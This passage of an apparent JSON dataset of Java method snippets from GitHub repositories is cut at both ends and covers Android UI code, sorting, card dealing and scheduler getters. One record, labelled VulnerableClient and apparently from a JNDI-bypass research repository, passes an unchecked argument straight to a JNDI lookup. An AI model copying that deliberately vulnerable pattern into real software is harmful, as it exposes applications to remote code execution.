["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {        if (BuildConfig.DEBUG) {            Utils.enableStrictMode();        }        super.onCreate(savedInstanceState);        setContentView(R.layout.image_detail_pager);        // Fetch screen height and width, to use as our max size when loading images as this        // activity runs full screen        final DisplayMetrics displayMetrics = new DisplayMetrics();        getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);        final int height = displayMetrics.heightPixels;        final int width = displayMetrics.widthPixels;        // For this sample we'll use half of the longest width to resize our images. As the        // image scaling ensures the image is larger than this, we should be left with a        // resolution that is appropriate for both portrait and landscape. For best image quality        // we shouldn't divide by 2, but this will use more memory and require a larger memory        // cache.        final int longest = (height > width ? height : width) / 2;        ImageCache.ImageCacheParams cacheParams =                new ImageCache.ImageCacheParams(this, IMAGE_CACHE_DIR);        cacheParams.setMemCacheSizePercent(0.25f); // Set memory cache to 25% of app memory        // The ImageFetcher takes care of loading images into our ImageView children asynchronously        mImageFetcher = new ImageFetcher(this, longest);        mImageFetcher.addImageCache(getSupportFragmentManager(), cacheParams);        mImageFetcher.setImageFadeIn(false);        // Set up ViewPager and backing adapter        mAdapter = new ImagePagerAdapter(getSupportFragmentManager(), Images.imageUrls.length);        mPager = (ViewPager) findViewById(R.id.pager);        mPager.setAdapter(mAdapter);        mPager.setPageMargin((int) getResources().getDimension(R.dimen.horizontal_page_margin));        mPager.setOffscreenPageLimit(2);        // Set up activity to go full screen        getWindow().addFlags(LayoutParams.FLAG_FULLSCREEN);        // Enable some additional newer visibility and ActionBar features to create a more        // immersive photo viewing experience        if (Utils.hasHoneycomb()) {            final ActionBar actionBar = getActionBar();            // Hide title text and set home as up            actionBar.setDisplayShowTitleEnabled(false);            actionBar.setDisplayHomeAsUpEnabled(true);            // Hide and show the ActionBar as the visibility changes            mPager.setOnSystemUiVisibilityChangeListener(                    new View.OnSystemUiVisibilityChangeListener() {                        @Override                        public void onSystemUiVisibilityChange(int vis) {                            if ((vis & View.SYSTEM_UI_FLAG_LOW_PROFILE) != 0) {                                actionBar.hide();                            } else {                                actionBar.show();                            }                        }                    });            // Start low profile mode and hide ActionBar            mPager.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LOW_PROFILE);            actionBar.hide();        }        // Set the current item based on the extra passed in to this activity        final int extraCurrentItem = getIntent().getIntExtra(EXTRA_IMAGE, -1);        if (extraCurrentItem != -1) {            mPager.setCurrentItem(extraCurrentItem);        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {        super.onResume();        mImageFetcher.setExitTasksEarly(false);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {        super.onPause();        mImageFetcher.setExitTasksEarly(true);        mImageFetcher.flushCache();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {        super.onDestroy();        mImageFetcher.closeCache();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "onOptionsItemSelected", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {        switch (item.getItemId()) {            case android.R.id.home:                NavUtils.navigateUpFromSameTask(this);                return true;            case R.id.clear_cache:                mImageFetcher.clearCache();                Toast.makeText(                        this, R.string.clear_cache_complete_toast,Toast.LENGTH_SHORT).show();                return true;        }        return super.onOptionsItemSelected(item);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "onCreateOptionsMenu", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main_menu, menu);        return true;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "getImageFetcher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImageFetcher", "snippet": "    public ImageFetcher getImageFetcher() {        return mImageFetcher;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {        final int vis = mPager.getSystemUiVisibility();        if ((vis & View.SYSTEM_UI_FLAG_LOW_PROFILE) != 0) {            mPager.setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE);        } else {            mPager.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LOW_PROFILE);        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImageDetailActivity", "extends": "FragmentActivity", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getCount() {            return mSize;        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImagePagerAdapter", "extends": "FragmentStatePagerAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "getItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Fragment", "snippet": "        public Fragment getItem(int position) {            return ImageDetailFragment.newInstance(Images.imageUrls[position]);        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailActivity.java", "stars": "74", "class": {"name": "ImagePagerAdapter", "extends": "FragmentStatePagerAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "RecyclerView", "snippet": "    public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {        return new ViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.list_singleline_item, parent, false));    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "GenreAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBindViewHolder", "params": ["RecyclerView", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(RecyclerView.ViewHolder holder, int position) {        ViewHolder viewHolder = (ViewHolder) holder;        if (mSelectedPos == position && mSelectedItem == null)            mSelectedItem = viewHolder.itemView;        viewHolder.itemView.setBackgroundColor(mSelectedPos == position ? mSelectedColor : mNormalColor);        viewHolder.text1.setText(getItem(position).getLabelId());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "GenreAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getItemId(int position) {        return position;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "GenreAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {        return mData.size();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "GenreAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Genre", "snippet": "    public Genre getItem(int position) {        return mData.get(position);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "GenreAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "setOnItemSelectionListener", "params": ["OnItemSelectionListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnItemSelectionListener(OnItemSelectionListener listener) {        mItemSelectionListener = listener;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "GenreAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View view) {            if (mItemSelectionListener != null) {                mSelectedPos = getAdapterPosition();                if(mSelectedItem != null) {                    mSelectedItem.setBackgroundColor(mNormalColor);                    mSelectedItem = itemView;                    mSelectedItem.setBackgroundColor(mSelectedColor);                }                mItemSelectionListener.onItemSelect(view, getItem(mSelectedPos), mSelectedPos);            }        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/GenreAdapter.java", "stars": "4", "class": {"name": "ViewHolder", "extends": "RecyclerView", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "sort", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void sort(int[] arr,int start,int end) {\t\tif(start < end) {\t\t\tthis.pIndex = partition(arr,start,end);\t\t\tsort(arr,start,pIndex-1);\t\t\tsort(arr,pIndex+1,end);\t\t}\t}", "url": "https://raw.githubusercontent.com/likith22/DataStructures/master/QuickSort.java", "stars": "2", "class": {"name": "QuickSort", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "partition", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int partition(int[] arr,int start,int end) {\t\tint pivot = arr[end];\t\tint temp;\t\tint pIndex = start;\t\tfor(int i = start; i < end ; i++) {\t\t\tif(arr[i] <= pivot) {\t\t\t\ttemp = arr[i];\t\t\t\tarr[i] = arr[pIndex];\t\t\t\tarr[pIndex] = temp;\t\t\t\tpIndex = pIndex + 1;\t\t\t}\t\t}\t\ttemp = arr[pIndex];\t\tarr[pIndex] = arr[end];\t\tarr[end] = temp;\t\t\t\treturn pIndex;\t}", "url": "https://raw.githubusercontent.com/likith22/DataStructures/master/QuickSort.java", "stars": "2", "class": {"name": "QuickSort", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main ( String[] argv ) throws Exception    {        String  name    = argv[0];        Context ctx     = new InitialContext();        ctx.lookup( name );    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test2/VulnerableClient.java", "stars": "2", "class": {"name": "VulnerableClient", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onAuthenticationFailure", "params": ["HttpServletRequest", "HttpServletResponse", "AuthenticationException"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAuthenticationFailure(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException {        httpServletResponse.setCharacterEncoding(\"UTF-8\");//\u8bbe\u7f6e\u670d\u52a1\u5668\u7684\u7f16\u7801\uff0c\u9ed8\u8ba4\u662fISO-8859-1        httpServletResponse.setContentType(\"application/json; charset = utf-8\");//\u544a\u8bc9\u6d4f\u89c8\u5668\u670d\u52a1\u5668\u7684\u7f16\u7801\u683c\u5f0f        String message = e.getMessage();        httpServletResponse.getWriter().write(new Gson().toJson(ApiResponse.ofMessage(ApiResponseEnum.BAD_REQUEST.getCode(), message)));    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/ajax_login/AjaxAuthenticationFailureHandler.java", "stars": "3", "class": {"name": "AjaxAuthenticationFailureHandler", "extends": null, "implements": ["AuthenticationFailureHandler"], "modifiers": ["public"]}}, {"method_name": "getLayoutId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {        return R.layout.empty_control_video;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/EmptyControlVideo.java", "stars": "2", "class": {"name": "EmptyControlVideo", "extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "touchSurfaceMoveFullLogic", "params": ["float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceMoveFullLogic(float absDeltaX, float absDeltaY) {        super.touchSurfaceMoveFullLogic(absDeltaX, absDeltaY);        //\u4e0d\u7ed9\u89e6\u6478\u5feb\u8fdb\uff0c\u5982\u679c\u9700\u8981\uff0c\u5c4f\u853d\u4e0b\u65b9\u4ee3\u7801\u5373\u53ef        mChangePosition = false;        //\u4e0d\u7ed9\u89e6\u6478\u97f3\u91cf\uff0c\u5982\u679c\u9700\u8981\uff0c\u5c4f\u853d\u4e0b\u65b9\u4ee3\u7801\u5373\u53ef        mChangeVolume = false;        //\u4e0d\u7ed9\u89e6\u6478\u4eae\u5ea6\uff0c\u5982\u679c\u9700\u8981\uff0c\u5c4f\u853d\u4e0b\u65b9\u4ee3\u7801\u5373\u53ef        mBrightness = false;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/EmptyControlVideo.java", "stars": "2", "class": {"name": "EmptyControlVideo", "extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "touchDoubleUp", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchDoubleUp() {        //super.touchDoubleUp();        //\u4e0d\u9700\u8981\u53cc\u51fb\u6682\u505c    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/EmptyControlVideo.java", "stars": "2", "class": {"name": "EmptyControlVideo", "extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateGuidance", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "GuidanceStylist", "snippet": "    public GuidanceStylist.Guidance onCreateGuidance(Bundle savedInstanceState) {        return new GuidanceStylist.Guidance(getString(R.string.update_available), getString(R.string.new_update), getString(R.string.app_name), null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVUpdateFragment.java", "stars": "4", "class": {"name": "TVUpdateFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateGuidanceStylist", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GuidanceStylist", "snippet": "    public GuidanceStylist onCreateGuidanceStylist() {        return new TermsGuidanceStylist();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVUpdateFragment.java", "stars": "4", "class": {"name": "TVUpdateFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateActions", "params": ["List<GuidedAction>", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreateActions(@NonNull List<GuidedAction> actions, Bundle savedInstanceState) {        GuidedAction acceptAction = new GuidedAction.Builder().id(R.id.action_update_now).hasNext(true).title(getString(R.string.now)).build();        GuidedAction declineAction = new GuidedAction.Builder().id(R.id.action_update_later).hasNext(true).title(getString(R.string.later)).build();        actions.add(acceptAction);        actions.add(declineAction);        super.onCreateActions(actions, savedInstanceState);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVUpdateFragment.java", "stars": "4", "class": {"name": "TVUpdateFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onGuidedActionClicked", "params": ["GuidedAction"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onGuidedActionClicked(GuidedAction action) {        switch ((int) action.getId()) {            case R.id.action_update_now:                String updateFile = PrefUtils.get(getActivity(), ButterUpdateManager.UPDATE_FILE, \"\");                Intent updateIntent = new Intent(Intent.ACTION_VIEW);                updateIntent.setDataAndType(Uri.parse(\"file://\" + updateFile), ButterUpdateManager.ANDROID_PACKAGE);                getActivity().startActivity(updateIntent);            case R.id.action_update_later:                getActivity().finish();                return;        }        super.onGuidedActionClicked(action);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVUpdateFragment.java", "stars": "4", "class": {"name": "TVUpdateFragment", "extends": "GuidedStepFragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onProvideLayoutId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int onProvideLayoutId() {            return R.layout.guidance_type1;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVUpdateFragment.java", "stars": "4", "class": {"name": "TermsGuidanceStylist", "extends": "GuidanceStylist", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "updateState", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void updateState(boolean gameIsWon) {\t\tif (cellModel.isRevealed()) {\t\t\tsetBackground(COLORS_BG[1]);\t\t}\t\t\t\tif (!cellModel.isRevealed() && cellModel.isMarked()) {\t\t\tsetText(\"\");\t\t\tsetIcon(ICON_MARKED);\t\t} else if (!cellModel.isRevealed()) {\t\t\tsetText(\"\");\t\t\tsetIcon(null);\t\t} else if (cellModel.isMine()) {\t\t\tsetText(\"\");\t\t\tsetIcon(gameIsWon ? ICON_WON : ICON_EXPLOSION);\t\t} else {\t\t\tif (cellModel.getNumber() == 0) {\t\t\t\tsetText(\"\");\t\t\t} else {\t\t\t\tsetText(cellModel.getNumber() + \"\");\t\t\t}\t\t\tsetIcon(null);\t\t}\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/gui/CellButton.java", "stars": "1", "class": {"name": "CellButton", "extends": "JButton", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNumRunningFlows", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumRunningFlows() {    return this.controller.getRunningFlows().size();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutionController.java", "stars": "18", "class": {"name": "JmxExecutionController", "extends": null, "implements": ["JmxExecutionControllerMBean"], "modifiers": ["public"]}}, {"method_name": "getPrimaryExecutorHostPorts", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getPrimaryExecutorHostPorts() {    return new ArrayList<>(this.controller.getPrimaryServerHosts());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutionController.java", "stars": "18", "class": {"name": "JmxExecutionController", "extends": null, "implements": ["JmxExecutionControllerMBean"], "modifiers": ["public"]}}, {"method_name": "getRunningFlows", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRunningFlows() {    return this.controller.getRunningFlowIds().toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutionController.java", "stars": "18", "class": {"name": "JmxExecutionController", "extends": null, "implements": ["JmxExecutionControllerMBean"], "modifiers": ["public"]}}, {"method_name": "getQueuedFlows", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getQueuedFlows() {    return this.controller.getQueuedFlowIds().toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutionController.java", "stars": "18", "class": {"name": "JmxExecutionController", "extends": null, "implements": ["JmxExecutionControllerMBean"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //1.\u51c6\u5907\u724c        //\u521b\u5efa\u4e00\u4e2aMap\u96c6\u5408,\u5b58\u50a8\u724c\u7684\u7d22\u5f15\u548c\u7ec4\u88c5\u597d\u7684\u724c        HashMap<Integer,String> poker = new HashMap<>();        //\u521b\u5efa\u4e00\u4e2aList\u96c6\u5408,\u5b58\u50a8\u724c\u7684\u7d22\u5f15        ArrayList<Integer> pokerIndex = new ArrayList<>();        //\u5b9a\u4e49\u4e24\u4e2a\u96c6\u5408,\u5b58\u50a8\u82b1\u8272\u548c\u724c\u7684\u5e8f\u53f7        List<String> colors = List.of(\"\u2660\", \"\u2665\", \"\u2663\", \"\u2666\");        List<String> numbers = List.of(\"2\", \"A\", \"K\", \"Q\", \"J\", \"10\", \"9\", \"8\", \"7\", \"6\", \"5\", \"4\", \"3\");        //\u628a\u5927\u738b\u548c\u5c0f\u738b\u5b58\u50a8\u5230\u96c6\u5408\u4e2d        //\u5b9a\u4e49\u4e00\u4e2a\u724c\u7684\u7d22\u5f15        int index = 0;        poker.put(index,\"\u5927\u738b\");        pokerIndex.add(index);        index++;        poker.put(index,\"\u5c0f\u738b\");        pokerIndex.add(index);        index++;        //\u5faa\u73af\u5d4c\u5957\u904d\u5386\u4e24\u4e2a\u96c6\u5408,\u7ec4\u88c552\u5f20\u724c,\u5b58\u50a8\u5230\u96c6\u5408\u4e2d        for (String number : numbers) {            for (String color : colors) {                poker.put(index,color+number);                pokerIndex.add(index);                index++;            }        }        //System.out.println(poker);        //System.out.println(pokerIndex);        /*            2.\u6d17\u724c            \u4f7f\u7528Collections\u4e2d\u7684\u65b9\u6cd5shuffle(List)         */        Collections.shuffle(pokerIndex);        //System.out.println(pokerIndex);        /*            3.\u53d1\u724c         */        //\u5b9a\u4e494\u4e2a\u96c6\u5408,\u5b58\u50a8\u73a9\u5bb6\u724c\u7684\u7d22\u5f15,\u548c\u5e95\u724c\u7684\u7d22\u5f15        ArrayList<Integer> player01 = new ArrayList<>();        ArrayList<Integer> player02 = new ArrayList<>();        ArrayList<Integer> player03 = new ArrayList<>();        ArrayList<Integer> diPai = new ArrayList<>();        //\u904d\u5386\u5b58\u50a8\u724c\u7d22\u5f15\u7684List\u96c6\u5408,\u83b7\u53d6\u6bcf\u4e00\u4e2a\u724c\u7684\u7d22\u5f15        for (int i = 0; i <pokerIndex.size() ; i++) {            Integer in = pokerIndex.get(i);            //\u5148\u5224\u65ad\u5e95\u724c            if(i>=51){                //\u7ed9\u5e95\u724c\u53d1\u724c                diPai.add(in);            }else if(i%3==0){                //\u7ed9\u73a9\u5bb61\u53d1\u724c                player01.add(in);            }else if(i%3==1){                //\u7ed9\u73a9\u5bb62\u53d1\u724c                player02.add(in);            }else if(i%3==2){                //\u7ed9\u73a9\u5bb63\u53d1\u724c                player03.add(in);            }        }        /*            4.\u6392\u5e8f            \u4f7f\u7528Collections\u4e2d\u7684\u65b9\u6cd5sort(List)            \u9ed8\u8ba4\u662f\u5347\u5e8f\u6392\u5e8f         */        Collections.sort(player01);        Collections.sort(player02);        Collections.sort(player03);        Collections.sort(diPai);        /*            5.\u770b\u724c            \u8c03\u7528\u770b\u724c\u7684\u65b9\u6cd5         */        lookPoker(\"\u5218\u5fb7\u534e\",poker,player01);        lookPoker(\"\u5468\u6da6\u53d1\",poker,player02);        lookPoker(\"\u5468\u661f\u9a70\",poker,player03);        lookPoker(\"\u5e95\u724c\",poker,diPai);    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo06/Test/DouDiZhu.java", "stars": "2", "class": {"name": "DouDiZhu", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "lookPoker", "params": ["String", "HashMap<Integer,String>", "ArrayList<Integer>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void lookPoker(String name,HashMap<Integer,String> poker,ArrayList<Integer> list){        //\u8f93\u51fa\u73a9\u5bb6\u540d\u79f0,\u4e0d\u6362\u884c        System.out.print(name+\":\");        //\u904d\u5386\u73a9\u5bb6\u6216\u8005\u5e95\u724c\u96c6\u5408,\u83b7\u53d6\u724c\u7684\u7d22\u5f15        for (Integer key : list) {            //\u4f7f\u7528\u724c\u7684\u7d22\u5f15,\u53bbMap\u96c6\u5408\u4e2d,\u627e\u5230\u5bf9\u5e94\u7684\u724c            String value = poker.get(key);            System.out.print(value+\" \");        }        System.out.println();//\u6253\u5370\u5b8c\u6bcf\u4e00\u4e2a\u73a9\u5bb6\u7684\u724c,\u6362\u884c    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo06/Test/DouDiZhu.java", "stars": "2", "class": {"name": "DouDiZhu", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRegistry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<T>", "snippet": "    public List<T> getRegistry() {        return registry;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "setRegistry", "params": ["List<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRegistry(List<T> registry) {        this.registry = registry;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "getClassRegistry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Class>", "snippet": "    public List<Class> getClassRegistry() {        return classRegistry;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "has", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean has(T check) {        return registry.contains(check);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "has", "params": ["Class"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean has(Class check) {        return classRegistry.contains(check);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "include", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void include(T add) {        if (!has(add))            registry.add(add);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "include", "params": ["Class"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void include(Class add) {        if (!has(add))            classRegistry.add(add);    }", "url": 